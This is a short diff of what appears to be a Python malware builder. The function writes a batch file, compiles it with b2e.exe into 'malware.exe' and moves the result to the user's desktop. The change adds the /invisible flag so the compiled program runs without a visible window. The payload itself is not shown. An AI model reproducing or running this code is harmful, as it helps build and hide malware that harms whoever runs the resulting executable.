@@ -201,8 +201,7 @@ def make():#working
     open('setup.exe.bat','w').write(a)
 
     print('Compiling malware...')
-    #system('b2e.exe /bat setup.exe.bat /exe malware.exe /invisible /include win.exe /overwrite')
-    system('b2e.exe /bat setup.exe.bat /exe malware.exe /include win.exe /overwrite')
+    system('b2e.exe /bat setup.exe.bat /exe malware.exe /invisible /include win.exe /overwrite')
 
     print('Compilation of file completed, moving file to desktop..')
     system(r'move malware.exe %userprofile%\Desktop')
